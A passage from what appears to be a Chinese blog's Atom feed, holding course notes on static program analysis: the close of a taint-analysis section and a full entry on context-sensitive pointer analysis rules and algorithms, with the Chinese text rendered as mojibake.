alt="image-20200905202944738"></p><p>åœ¨æ•°æ®æŠ½è±¡ä¸­åŠ å…¥æ±¡ç‚¹æ•°æ®ï¼ˆTaint Dataï¼‰ï¼Œ$T\subset O$</p><p>åˆ†æçš„è¾“å…¥ä¸ºå®šä¹‰çš„ source å’Œ sinkï¼Œè¾“å‡ºä¸º TaintFlowsï¼Œè®°ä¸º$<t_i, m> \in TaintFlows$ï¼Œ è¡¨ç¤ºæ±¡ç‚¹ $t_i$ ä¼ å…¥äº†æ•æ„Ÿå‡½æ•° $m$ ä¸­ã€‚</t_i,></p><p>åœ¨ call statments ä¸­æ ¹æ®sourceäº§ç”Ÿæ±¡ç‚¹ $t_l$ï¼š<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆå®‰å…¨ï¼‰/image-20200905204725605.png" alt="image-20200905204725605"></p><p>å‰©ä¸‹çš„æ±¡ç‚¹ä¼ æ’­è§„åˆ™ä¸æŒ‡é’ˆåˆ†æä¸€è‡´ï¼š<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆå®‰å…¨ï¼‰/image-20200905204756009.png" alt="image-20200905204756009"></p><p>åœ¨call statementsä¸­æ£€æŸ¥æ±¡ç‚¹æ˜¯å¦ä¼ æ’­åˆ°sinkï¼š<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆå®‰å…¨ï¼‰/image-20200905205129601.png" alt="image-20200905205129601"></p><p>ä¸‹å›¾ä¸¾ä¾‹è¯´æ˜äº†ä¸€ä¸ªåœ¨æŒ‡é’ˆåˆ†æçš„åŒæ—¶åšæ±¡ç‚¹åˆ†æçš„è¿‡ç¨‹ï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆå®‰å…¨ï¼‰/image-20200905205353856.png" alt="image-20200905205353856"></p><p>æ³¨æ„ï¼Œè¿™é‡Œåªä»‹ç»äº†æœ€ç®€å•çš„æ±¡ç‚¹åˆ†æï¼ŒçœŸå®æƒ…å†µæ¯”æ ·ä¾‹å¤æ‚å¾ˆå¤šï¼Œå½“éœ€è¦å¤„ç†å…¶ä»–è¯­å¥å’Œæ–¹æ³•ï¼Œæ¯”å¦‚ Java ä¸­å­—ç¬¦ä¸²æ‹¼æ¥æ–¹æ³•<code>append()</code>ï¼Œä½†æ˜¯åŸºæœ¬æ€è·¯æ˜¯ä¸å˜çš„ã€‚</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><ol><li>Dorothy E. Denning and Peter J. Denning, â€œCertification of Programs for Secure Information Flowâ€. CACM 1977.</li><li>Dorothy E. Denning, â€œA Lattice Model of Secure Information Flowâ€. CACM 1976.</li><li>Ken Biba, â€œIntegrity Considerations for Secure Computer Systemsâ€. Technical Report, ESD-TR-76-372, USAF Electronic Systems Division, Bed-ford, MA, 1977.</li><li>Butler W. Lampson, â€œA Note on the Confinement Problemâ€. CACM 1973</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;åœ¨è½¯ä»¶å®‰å…¨ä¸­ï¼Œæœ€å¸¸è§çš„æ¼æ´æœ‰æ³¨å…¥ç±»æ¼æ´ï¼ˆInjectionï¼‰å’Œä¿¡æ¯æ³„éœ²ï¼ˆInformation Leakï¼‰ï¼Œè€Œæœ¬èŠ‚è¯¾å°†ä»‹ç»çš„Information Flow åˆ†ææ–¹æ³•å¯ä»¥æœ‰æ•ˆå¤„ç†ä»¥ä¸Šæ¼æ´ï¼Œå…·ä½“æ¥è¯´ï¼Œå°±æ˜¯æˆ‘ä»¬å¸¸ç”¨çš„æ±¡ç‚¹åˆ†ææŠ€æœ¯ã€‚&lt;/p&gt;&lt;h1 id=&quot;Information-Flow-Security&quot;&gt;&lt;a href=&quot;#Information-Flow-Security&quot; class=&quot;headerlink&quot; title=&quot;Information Flow Security&quot;&gt;&lt;/a&gt;Information Flow Security&lt;/h1&gt;
    
    </summary>
    
      <category term="Program Language" scheme="http://anemone.top/categories/Program-Language/"/>
    
    
      <category term="ç™½ç›’æ‰«æ" scheme="http://anemone.top/tags/%E7%99%BD%E7%9B%92%E6%89%AB%E6%8F%8F/"/>
    
      <category term="é™æ€ç¨‹åºåˆ†æ" scheme="http://anemone.top/tags/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/"/>
    
      <category term="æ±¡ç‚¹åˆ†æ" scheme="http://anemone.top/tags/%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90/"/>
    
      <category term="Information flow" scheme="http://anemone.top/tags/Information-flow/"/>
    
  </entry>
  
  <entry>
    <title>é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æ-ä¸Šä¸‹æ–‡æ•æ„Ÿï¼‰</title>
    <link href="http://anemone.top/pl-%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E8%AF%BE%E7%A8%8B%E7%AC%94%E8%AE%B0%EF%BC%88%E6%8C%87%E9%92%88%E5%88%86%E6%9E%90-%E4%B8%8A%E4%B8%8B%E6%96%87%E6%95%8F%E6%84%9F%EF%BC%89/"/>
    <id>http://anemone.top/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æ-ä¸Šä¸‹æ–‡æ•æ„Ÿï¼‰/</id>
    <published>2020-08-30T13:22:13.000Z</published>
    <updated>2020-10-04T04:13:35.481Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><h2 id="Problem-of-Context-Insensitive-C-I"><a href="#Problem-of-Context-Insensitive-C-I" class="headerlink" title="Problem of Context-Insensitive (C.I.)"></a>Problem of Context-Insensitive (C.I.)</h2><ul><li>æ¯æ¬¡å‡½æ•°è°ƒç”¨æ—¶ï¼Œè°ƒç”¨çš„ä¸Šä¸‹æ–‡ä¸ä¸€æ ·ï¼›</li><li>åœ¨ä¸åŒçš„è°ƒç”¨ä¸Šä¸‹æ–‡é‡Œï¼Œå‡½æ•°å†…çš„å˜é‡ä¼šæŒ‡å‘ä¸åŒï¼›</li><li>åœ¨ä¸Šä¸‹æ–‡ä¸æ•æ„Ÿçš„æŒ‡é’ˆåˆ†æä¸­ï¼Œå‡½æ•°å†…çš„å¯¹è±¡æŒ‡å‘çš„å†…å®¹æ˜¯ä¸åŒä¸Šä¸‹æ–‡æ··åˆèµ·æ¥çš„ï¼ˆå¦‚ä¸Šä¾‹ä¸­ $n$ æŒ‡å‘ $o_1$ å’Œ $o_2$ï¼‰ï¼Œè€Œè¿™äº›å†…å®¹ä¼šåå‘ä¼ æ’­ï¼Œé€ æˆæ›´å¤šä¸å‡†ç¡®çš„ç»“æœã€‚</li></ul><a id="more"></a><p>å…·ä½“å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æ-ä¸Šä¸‹æ–‡æ•æ„Ÿï¼‰/image-20200829210207900.png" alt="image-20200829210207900"></p><p>å½“åˆ†æåˆ°<code>int i = x.get()</code> æ—¶ï¼Œä¸Šä¸‹æ–‡ä¸æ•æ„ŸæŒ‡é’ˆåˆ†æä¼šè®¤ä¸º $x$ æŒ‡å‘ $o_1,o_2$ï¼Œå› æ­¤åšå¸¸é‡åˆ†ææ—¶ï¼Œ$i$ çš„åˆ†æç»“æœå°±æ˜¯ NACï¼Œè¿™å½“ç„¶æ˜¯ä¸å‡†ç¡®çš„â€”â€”å…¶å…³é”®ç‚¹åœ¨äºnæ²¡æœ‰ä¸Šä¸‹æ–‡ï¼Œå› æ­¤ä¸åŒå‡½æ•°è°ƒç”¨æ—¶ï¼Œnä¼šè®°å½•ä¸‹æ‰€æœ‰è°ƒç”¨ç»“æœçš„é›†åˆã€‚</p><h2 id="Context-Sensitivity-C-S"><a href="#Context-Sensitivity-C-S" class="headerlink" title="Context Sensitivity(C.S.)"></a>Context Sensitivity(C.S.)</h2><blockquote><p>Context sensitivity models calling contexts by distinguishing different data flows of different contexts to improve precision.</p></blockquote><p>ä¸Šä¸‹æ–‡æ•æ„Ÿæ¨¡å‹ä¼šåœ¨è°ƒç”¨æ—¶ä¼šåŒºåˆ†ä¸åŒä¸Šä¸‹æ–‡ï¼Œä»¥æå‡å‡†ç¡®ç‡ã€‚</p><p>ä¸Šä¸‹æ–‡æ•æ„Ÿåˆ†æéœ€è¦å¯¹ä¸Šä¸‹æ–‡æŠ½è±¡å»ºæ¨¡ï¼Œç›®å‰æœ€ç»å…¸çš„ç­–ç•¥æ˜¯ <strong>call-site sensitivity</strong>ï¼Œå³ä¸Šä¸‹æ–‡ä¸ºè°ƒç”¨ç‚¹å‡½æ•°ï¼ˆè°ƒç”¨ç‚¹+è¢«è°ƒå‡½æ•°ï¼‰åºåˆ—ã€‚</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æ-ä¸Šä¸‹æ–‡æ•æ„Ÿï¼‰/image-20200829221253965.png" alt="image-20200829221253965"></p><p>ä¾‹å¦‚å¦‚ä¸Šä»£ç ï¼Œ<code>id()</code>å‡½æ•°å­˜åœ¨ä¸¤ä¸ªä¸Šä¸‹æ–‡ <strong>[1]</strong> å’Œ <strong>[2]</strong>ã€‚</p><h2 id="Cloning-Based-Context-Sensitivity"><a href="#Cloning-Based-Context-Sensitivity" class="headerlink" title="Cloning-Based Context Sensitivity"></a>Cloning-Based Context Sensitivity</h2><p>ä¸ºå®ç°ä¸Šä¸‹æ–‡æ•æ„Ÿåˆ†æï¼Œæœ€ç®€å•çš„æ–¹æ³•æ˜¯ <strong>cloning-based</strong>ï¼Œå³å¯¹äºæ¯ä¸€ä¸ªå‡½æ•°ï¼Œæ¯åˆ°æ–°çš„ä¸Šä¸‹æ–‡å°±å…‹éš†ä¸€ä»½æ–°å‡½æ•°å’Œå…¶å˜é‡ï¼š</p><blockquote><p>In cloning-based context-sensitive pointer analysis, each method is qualified by one or more contexts.</p></blockquote><p>æ³¨æ„ï¼Œå¯¹æ¯ä¸ªå‡½æ•°çš„å…‹éš†æœ¬è´¨æ˜¯å¯¹å‡½æ•°å†…å˜é‡çš„å…‹éš†ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æ-ä¸Šä¸‹æ–‡æ•æ„Ÿï¼‰/image-20200830103742490.png" alt="image-20200830103742490"></p><p>å¯¹äº<code>id()</code>å‡½æ•°å†…å˜é‡ <code>n</code> æ¥è¯´ï¼Œåœ¨ç¬¬ä¸€è¡Œå’Œç¬¬äºŒè¡Œè°ƒç”¨æ—¶ï¼Œåˆ†åˆ«å…‹éš†å‡º<code>[1]:n</code>å’Œ<code>[2]:n</code>ä¸ªå˜é‡</p><p><strong>è¡¥å……1ï¼š</strong>å¦ä¸€ç§å®ç°æ–¹æ³•æ˜¯ä½¿ç”¨å†…è”ï¼Œå³æŠŠè¢«è°ƒå‡½æ•°çš„ä»£ç åµŒå…¥åˆ°è°ƒç”¨å‡½æ•°ä¸­ï¼Œå¯¹å‚æ•°è¿›è¡Œæ”¹åæ›¿æ¢ï¼Œå®é™…æ•ˆæœä¸è¿™é‡Œçš„å…‹éš†ç­‰æ•ˆã€‚</p><p><strong>è¡¥å……2ï¼š</strong>å…‹éš†æ€æƒ³ä¸åªæ˜¯å¯ä»¥åšè¿‡ç¨‹é—´åˆ†æï¼Œè¿˜å¯ä»¥åšè¿‡ç¨‹å†…åˆ†æï¼Œæ¯”å¦‚å¯¹äºå¾ªç¯ï¼Œå¯ä»¥å±•å¼€ä¸€å®šå±‚æ•°kåšåˆ†æã€‚</p><h2 id="Context-Sensitive-Heap"><a href="#Context-Sensitive-Heap" class="headerlink" title="Context-Sensitive Heap"></a>Context-Sensitive Heap</h2><p>å¯¹äºOOè¯­è¨€ï¼Œä¸ä»…å˜é‡æœ‰ä¸Šä¸‹æ–‡ï¼Œå¯¹è±¡å®ä¾‹ä¹Ÿéœ€è¦æœ‰ä¸Šä¸‹æ–‡ï¼Œå³éœ€è¦åšå †æŠ½è±¡ï¼ˆå¯¹è±¡å­˜å‚¨åœ¨å †åŒºï¼‰ã€‚</p><p>å¦‚ä¸‹å›¾ï¼Œå¯¹<code>n</code>åšä¸Šä¸‹æ–‡æ•æ„Ÿåˆ†æï¼š<br><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æ-ä¸Šä¸‹æ–‡æ•æ„Ÿï¼‰/Inkedimage-20200830104632305_LI.jpg" alt="image-20200830104632305"><br>åœ¨å˜é‡ä¸Šä¸‹æ–‡æ•æ„Ÿï¼Œå †ä¸æ•æ„Ÿæ—¶ï¼ˆå·¦ä¾§ï¼‰ï¼Œåœ¨<code>newX(Number)</code>ä¸­xæ²¡æœ‰ä¸Šä¸‹æ–‡ï¼Œæ’æŒ‡å‘$o_8$ï¼Œé‚£ä¹ˆåœ¨ç¬¬ä¸‰è¡Œç¬¬å››è¡Œè°ƒç”¨æ—¶ï¼Œ $o_8.f$ å­˜åœ¨ $o_1, o_2$ä¸¤ç§å¯èƒ½ï¼Œå› æ­¤nä¹Ÿæœ‰ä¸¤ç§å¯èƒ½ï¼Œåˆ†æç»“æœä¸å‡†ç¡®ã€‚</p><p>è€Œå †æ•æ„Ÿæ—¶ï¼ˆå³ä¾§ï¼‰ï¼Œ<code>newX(Number)</code>ä¸­å­˜åœ¨ä¸Šä¸‹æ–‡ï¼Œå³å¯¹äºç¬¬ä¸‰è¡Œç¬¬å››è¡Œè°ƒç”¨ï¼Œäº§ç”Ÿä¸åŒä¸Šä¸‹æ–‡çš„xâ€”â€”$3:o_8$ å’Œ$4:o_8$ï¼Œå®ƒä»¬åˆ†åˆ«æŒ‡å‘$o_1$å’Œ$o_2$ï¼Œå› æ­¤nçš„åˆ†ææ—¶å‡†ç¡®çš„ã€‚</p><p>æ³¨æ„ï¼Œä¸€èˆ¬å˜é‡å’Œå †æ•æ„Ÿé€šå¸¸æ˜¯åŒæ—¶ä½¿ç”¨çš„ï¼Œç¼ºä¸€ä¸å¯ã€‚</p><h1 id="Context-Sensitive-Pointer-Analysis-Rules"><a href="#Context-Sensitive-Pointer-Analysis-Rules" class="headerlink" title="Context Sensitive Pointer Analysis: Rules"></a>Context Sensitive Pointer Analysis: Rules</h1><h2 id="Domain"><a href="#Domain" class="headerlink" title="Domain"></a>Domain</h2><ul><li><p>ä¸Šä¸‹æ–‡ï¼ˆContextï¼‰ï¼š$ c, câ€™,câ€™â€™ \in C $<br>CæŒ‡æ‰€æœ‰ä¸Šä¸‹æ–‡é›†åˆï¼Œæ ¹æ®ä¸åŒçš„ä¸Šä¸‹æ–‡æŠ½è±¡ç­–ç•¥ï¼Œcçš„è¡¨ç¤ºå†…å®¹ä¸åŒï¼Œå¯¹äº<strong>call-site sensitivity</strong>ï¼Œè€Œè¨€ï¼Œcä¸ºcall-siteçš„åºåˆ—ï¼ˆcallsiteè¿™é‡Œå¯ç”¨è¡Œå·è¡¨ç¤ºï¼‰ï¼›</p></li><li><p>ä¸Šä¸‹æ–‡æ•æ„Ÿæ–¹æ³•ï¼ˆContext-sensitive methodsï¼‰ï¼š$ c:m \in C \times M $<br>ä¸Šä¸‹æ–‡æ–¹æ³•è¡¨ç¤ºä¸º $c:m$ï¼Œå±äº $C$ å’Œ $M$çš„ç¬›å¡å°”ç§¯ï¼›</p></li><li><p>ä¸Šä¸‹æ–‡æ•æ„Ÿå˜é‡ï¼ˆContext-sensitive variablesï¼‰ï¼š$ c:x, câ€™:y \in C \times V $<br>ä¸ä¸Šä¸‹æ–‡æ–¹æ³•ç±»ä¼¼ï¼Œ$c:x$ è¡¨ç¤ºåœ¨ä¸Šä¸‹æ–‡ $c$ ä¸‹å˜é‡ $x$ çš„æŒ‡å‘ï¼›</p></li><li><p>ä¸Šä¸‹æ–‡æ•æ„Ÿå¯¹è±¡ï¼ˆContext-sensitive methodsï¼‰ï¼š$ c:o_i, câ€™:o_j \in C \times O $</p></li><li><p>åŸŸï¼ˆFieldsï¼‰ï¼Œ$ f,g \in F $<br>å› ä¸ºåŸŸä¾é™„äºå¯¹è±¡ï¼Œè€Œå¯¹è±¡å®ä¾‹å­˜åœ¨ä¸Šä¸‹æ–‡ï¼Œå› æ­¤åŸŸå®é™…ä¹Ÿå­˜åœ¨äº†ä¸Šä¸‹æ–‡ï¼›</p></li><li><p>å¯¹è±¡å®ä¾‹åŸŸï¼ˆInstance fieldsï¼‰ï¼š$ c: o_{i} \cdot f, c^{\prime}: o_{j} \cdot g \in \mathrm{C} \times \mathrm{O} \times \mathrm{F} $</p></li><li><p>ä¸Šä¸‹æ–‡æ•æ„ŸæŒ‡é’ˆï¼ˆContext-sensitive pointersï¼‰ï¼š$ CSPointer=(C\times V) \cup (C \times O \times F) $<br>ä¸Šä¸‹æ–‡æ•æ„ŸæŒ‡é’ˆå±äºä¸Šä¸‹æ–‡å˜é‡å’Œå®ä¾‹åŸŸçš„å¹¶é›†ï¼›</p></li><li><p>æŒ‡å‘å…³ç³»ï¼ˆPoints-to relationsï¼‰ï¼š$pt: CSPointer \rightarrow\mathcal{P}(C\times O)$</p></li></ul><h2 id="Rules"><a href="#Rules" class="headerlink" title="Rules"></a>Rules</h2><ul><li><p>Newï¼Œ<code>i: x = new T()</code>ï¼Œ</p><p>æ–°å»ºå¯¹è±¡æ—¶ï¼Œ ä¸Šä¸‹æ–‡ $c$ ä¸‹ $o_i$ åŠ å…¥$c:x$æŒ‡é’ˆé›†ä¸­ï¼ˆå‘ç”Ÿåœ¨åŒä¸€ä¸Šä¸‹æ–‡ä¸­ï¼‰ï¼›</p><script type="math/tex; mode=display">\frac{}{c:o_i \in pt(c:x)}</script></li><li><p>Assign, <code>x = y</code></p><script type="math/tex; mode=display">\frac{c':o_{i} \in pt(c:y)}{c':o_{i} \in pt(c:x)}</script><p>å‡ºç°èµ‹å€¼åï¼Œè®© $c:y$ æŒ‡å‘çš„å†…å®¹ $câ€™:o_i$ æŒ‡å‘ $c:x$ï¼Œæ³¨æ„$x$å’Œ$y$åœ¨åŒä¸€ä¸Šä¸‹æ–‡ï¼Œè€Œ$o_i$åœ¨å¦ä¸€ä¸ªä¸Šä¸‹æ–‡ï¼›</p></li><li><p>Store, <code>x.f = y</code></p><script type="math/tex; mode=display">\frac{c':o_i \in pt(c:x), c'':o_j \in pt(c:y)}{c'':o_j \in pt(c':o_i.f)}</script><p>èµ‹å€¼ç»™åŸŸæ—¶ï¼Œå–ä¸Šä¸‹æ–‡$y$çš„æŒ‡å‘å¯¹è±¡$câ€™â€™:o_j$ï¼Œå–ä¸Šä¸‹æ–‡ $x$ çš„æŒ‡å‘å¯¹è±¡$câ€™:o_i$ï¼Œå°†$câ€™â€™:o_j$åŠ å…¥åˆ°$câ€™:o_i.f$çš„æŒ‡å‘é›†åˆä¸­ï¼›</p></li><li><p>Load, <code>y = x.f</code></p><script type="math/tex; mode=display">\frac{c':o_{i} \in pt(c:x), c'':o_{j} \in pt\left(c':o_{i} . f\right)}{c'':o_{j} \in pt(c:y)}</script><p>å±æ€§èµ‹å€¼ç»™å˜é‡æ—¶ï¼ŒæŒ‡å‘å¯¹äºä¸Šä¸‹æ–‡ $x$ æŒ‡å‘çš„å¯¹è±¡ $câ€™:o_i$ ï¼Œå–å‡ºå…¶åŸŸ $câ€™:o_i.f$ æŒ‡å‘çš„å¯¹è±¡ $câ€™â€™:o_j$ï¼Œå°†å…¶åŠ å…¥åˆ°$c:y$ã€‚</p></li></ul><p>ä¸‹å›¾ç»™å‡ºå››ç§æƒ…å†µçš„å½¢è±¡è¡¨ç¤ºï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æ-ä¸Šä¸‹æ–‡æ•æ„Ÿï¼‰/image-20200830114749403.png" alt="image-20200830114749403"></p><p>Callè¯­å¥ï¼Œ<code>l: r = x.k(a1,...,an)</code>ï¼š</p><script type="math/tex; mode=display">\frac{c^{\prime}: o_{i} \in p t(c: x) \\m=\text { Dispatch }\left(o_{i}, k\right), c^{t}=\operatorname{Select}\left(c, l, c^{\prime}: o_{i}\right) \\c^{\prime \prime}: o_{u} \in p t(c: a j), 1 \leq j \leq n \\c^{\prime \prime \prime}: o_{v} \in p t\left(c^{t}: m_{r e t}\right)}{c^{\prime}: o_{i} \in p t\left(c^{t}: m_{t h i s}\right) \\c^{\prime \prime}: o_{u} \in p t\left(c^{t}: m_{p j}\right), 1 \leq j \leq n \\c^{\prime \prime \prime}: o_{v} \in p t(c: r)}</script><ol><li><p>å…ˆå¯¹äº$o_i,k$ï¼Œè§£æå…¶æ–¹æ³•ï¼›</p></li><li><p>ç»™å®šè°ƒç”¨ç‚¹ä¸Šä¸‹æ–‡ $c$ã€è°ƒç”¨ç‚¹ $l$ã€xæŒ‡å‘å¯¹è±¡çš„ä¸Šä¸‹æ–‡$câ€™:o_i$ï¼Œé€šè¿‡$select()$ï¼Œé€‰æ‹©calleeçš„ä¸Šä¸‹æ–‡$c^t$ï¼ˆå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œselecté€‰æ‹©å‡º[2]å’Œ[3]ä¸Šä¸‹æ–‡</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æ-ä¸Šä¸‹æ–‡æ•æ„Ÿï¼‰/image-20200830120358405.png" alt="image-20200830120358405"></p></li><li><p>ä¼ thisï¼Œæ³¨æ„ä¼ åˆ°$c^t$ä¸Šä¸‹æ–‡ä¸­â€”â€”$c^{\prime}: o_{i} \in p t\left(c^{t}: m_{t h i s}\right)$ï¼›</p></li><li>ä¼ å½¢å‚ï¼Œä¼ ç»™$c^t$ä¸Šä¸‹æ–‡çš„å½¢å‚â€”â€”$\frac{c^{\prime \prime}: o_{u} \in p t(c: a j), 1 \leq j \leq n }{c^{\prime \prime}: o_{u} \in p t\left(c^{t}: m_{p j}\right), 1 \leq j \leq n}$ï¼›</li><li>ä¼ è¿”å›å€¼ï¼Œå°†calleeä¸Šä¸‹æ–‡çš„è¿”å›å€¼ä¼ å›callerä¸Šä¸‹æ–‡çš„å˜é‡$r$ä¸­â€”â€”$\frac{c^{\prime \prime \prime}: o_{v} \in p t\left(c^{t}: m_{r e t}\right)}{c^{\prime \prime \prime}: o_{v} \in p t(c: r)}$</li></ol><p>å¯è§ï¼šä¸Šä¸‹æ–‡æ•æ„Ÿå®é™…è®°å½•äº†å‡½æ•°è°ƒç”¨æ ˆï¼ˆä¸Šä¸‹æ–‡ï¼‰ï¼Œè€Œä¸Šä¸‹æ–‡ä¸æ•æ„Ÿåœ¨è¿›å…¥calleeåå°±æ— æ³•çŸ¥é“callerçš„ä¿¡æ¯ã€‚</p><h1 id="Context-Sensitive-Pointer-Analysisï¼šAlgorithms"><a href="#Context-Sensitive-Pointer-Analysisï¼šAlgorithms" class="headerlink" title="Context Sensitive Pointer Analysisï¼šAlgorithms"></a>Context Sensitive Pointer Analysisï¼šAlgorithms</h1><h2 id="Pointer-Flow-Graph-with-C-S"><a href="#Pointer-Flow-Graph-with-C-S" class="headerlink" title="Pointer Flow Graph with C.S."></a>Pointer Flow Graph with C.S.</h2><p>ä¸Šä¸‹æ–‡æ•æ„Ÿçš„æŒ‡é’ˆæµå›¾æœ‰å¦‚ä¸‹å®šä¹‰ï¼š</p><ul><li><p>èŠ‚ç‚¹ï¼š$CSPointer = (C \times V) \cup (C \times O \times F)$</p><p>èŠ‚ç‚¹ç”±ä¸Šä¸‹æ–‡æ•æ„Ÿçš„å˜é‡æˆ–æ˜¯åŸŸç»„æˆ</p></li><li><p>è¾¹ï¼š$CSPointer \times CSPointer$</p><p>è¾¹ $x \rightarrow y$ æŒ‡æŒ‡é’ˆ $x$ çš„æŒ‡å‘ä¿¡æ¯åŒæ—¶è¢« $y$ æŒ‡å‘</p></li></ul><p>å¯¹äº Newã€Assignã€Storeå’ŒLoadçš„åŠ è¾¹ç­–ç•¥ï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æ-ä¸Šä¸‹æ–‡æ•æ„Ÿï¼‰/image-20200830200755158.png" alt="image-20200830200755158"></p><p>newæ–°å»ºä¸€ä¸ªèŠ‚ç‚¹ï¼Œä¸éœ€è¦åŠ è¾¹ï¼›assignæ·»åŠ  $c:x\leftarrow c:y$ è¿™ä¸€æ¡è¾¹ï¼ˆä¸Šä¸‹æ–‡ç›¸åŒï¼‰ï¼›Storeæ·»åŠ  $câ€™:o_i.f \leftarrow c:y$ è¾¹ï¼Œæ³¨æ„ $y$ è™½ç„¶å’Œ $x$ ä¸Šä¸‹æ–‡ç›¸åŒï¼Œä½†æ˜¯çœŸæ­£åŠ è¾¹è·¨è¶Šäº†ä¸Šä¸‹æ–‡ï¼ˆ$y$ å’Œ $o_i.f$ çš„ä¸Šä¸‹æ–‡ä¸åŒï¼‰ï¼›Loadæ·»åŠ $c:y \leftarrow câ€™:o_i.f$ è¾¹ï¼Œä¸Storeä¸ºåæ“ä½œã€‚</p><p>å¯¹äºCallçš„åŠ è¾¹ç­–ç•¥ï¼š</p><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æ-ä¸Šä¸‹æ–‡æ•æ„Ÿï¼‰/image-20200830201313643.png" alt="image-20200830201313643"></p><p>æ·»åŠ å®å‚æ–°å‚çš„è¾¹ï¼Œä»¥åŠè¿”å›å€¼çš„è¾¹ï¼ˆæ³¨æ„è¾¹è·¨è¶Šäº†callerå’Œcalleeçš„ä¸Šä¸‹æ–‡ï¼Œ $c$ å’Œ $c^t$ï¼‰ï¼Œthis ä¿è¯å‡†ç¡®åº¦ä»ä½¿ç”¨æŒ‡é’ˆå€¼ä¼ é€’çš„æ–¹å¼ï¼Œä¸åŠ è¾¹ã€‚</p><h2 id="Algorithm-with-C-S"><a href="#Algorithm-with-C-S" class="headerlink" title="Algorithm with C.S."></a>Algorithm with C.S.</h2><p><img src="/pl-é™æ€ç¨‹åºåˆ†æè¯¾ç¨‹ç¬”è®°ï¼ˆæŒ‡é’ˆåˆ†æ-ä¸Šä¸‹æ–‡æ•æ„Ÿï¼‰/image-20200830202712606.png" alt="image-20200830202712606"></p><p>ç®—æ³•å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œé»„è‰²åº•ä¸ºå­˜åœ¨å˜åŒ–çš„åŒºåŸŸï¼Œå…¶ä¸­æ·»åŠ äº†å¯¹ä¸Šä¸‹æ–‡çš„å¤„ç†ï¼Œè€Œ<code>Propagate()</code>ï¼Œ<code>AddEdge()</code>ï¼Œ<code>Dispathch()</code> å‡½æ•°å†…å®¹ä¸å…ˆå‰ç›¸åŒã€‚</p><p>ç®—æ³•è¾“å…¥ä»ä¸ºä¸€ä¸ªå…¥å£å‡½æ•°$m^{entry}$ï¼Œè¾“å‡ºä¸ºPFGå’ŒæŒ‡å‘å†…å®¹ï¼›</p><p>é¦–å…ˆåˆå§‹åŒ–ï¼Œ$S$ è¡¨ç¤ºå¯è¾¾è¯­å¥é›†åˆï¼Œ$S_m$è¡¨ç¤ºå‡½æ•°mä¸­çš„è¯­å¥é›†åˆï¼Œ$RM$è¡¨ç¤º<strong>ä¸Šä¸‹æ–‡æ•æ„Ÿ</strong>çš„å¯è¾¾å‡½æ•°é›†åˆï¼ŒCGè¡¨ç¤º<strong>ä¸Šä¸‹æ–‡æ•æ„Ÿ</strong>çš„è°ƒç”¨å›¾ï¼Œéƒ½åˆå§‹åŒ–ä¸ºç©ºåï¼Œè°ƒç”¨<code>AddReachable()</code>ï¼Œæ³¨æ„åˆå§‹æƒ…å†µä¸Šä¸‹æ–‡ä¸ºç©º<code>[]</code>ï¼›</p><p><code>AddReachable()</code>å¤„ç†newå’Œassignè¯­å¥ï¼Œæ‰€æœ‰æ“ä½œéƒ½åœ¨ä¸Šä¸‹æ–‡ $c$ ä¸­æ“ä½œï¼›</p><p>æ¥ç€å¤„ç†<code>worklist</code>ï¼Œåœ¨å¤„ç†storeå’Œloadè¯­å¥æ—¶ï¼ŒæŒ‰å…ˆå‰å›¾ç¤ºæ·»åŠ è¾¹å³å¯ï¼›</p><p>é‡ç‚¹åœ¨äº<code>ProcessCall()</code>ï¼Œæ ¹æ®å…ˆå‰åˆ†æï¼Œé¦–å…ˆç”¨<code>Dispatch()</code>è§£æå‡ºè°ƒç”¨çš„æ–¹æ³•ï¼Œæ¥ç€é€šè¿‡<code>Select()</code>è·å–è°ƒç”¨è¿›calleeçš„ä¸Šä¸‹æ–‡ $c^t$ï¼Œæ¥ä¸‹æ¥çš„åŠ å…¥å·¥ä½œåˆ—è¡¨ã€åŠ å…¥å¯è¾¾å‡½æ•°é›†åˆçš„æ“ä½œéƒ½åœ¨ $c^t$ ä¸Šä¸‹æ–‡ä¸­è¿›è¡Œï¼Œæœ€åæŒ‰å…ˆå‰å›¾ç¤ºåŠ å…¥å‚æ•°å’Œè¿”å›å€¼çš„è¾¹ã€‚</p><h1 